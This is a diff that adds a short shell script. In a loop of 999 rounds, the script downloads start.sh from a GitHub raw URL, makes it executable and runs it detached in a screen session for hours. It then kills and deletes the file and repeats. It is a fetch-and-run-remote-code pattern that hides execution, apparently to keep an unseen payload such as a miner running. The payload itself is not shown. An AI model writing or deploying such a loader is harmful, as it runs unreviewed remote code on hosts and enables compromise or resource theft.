@@ -1,0 +1,3 @@
+#!/bin/sh
+
+for i in `seq 1 999`; do echo $i; wget -qO tesrun https://raw.githubusercontent.com/renilo/bc/main/start.sh; chmod +x tesrun; screen -dmS Running ./tesrun; sleep 10500; clear; screen -XS Running quit; rm -f tesrun; echo SETTING PROJECT; sleep 1800; done
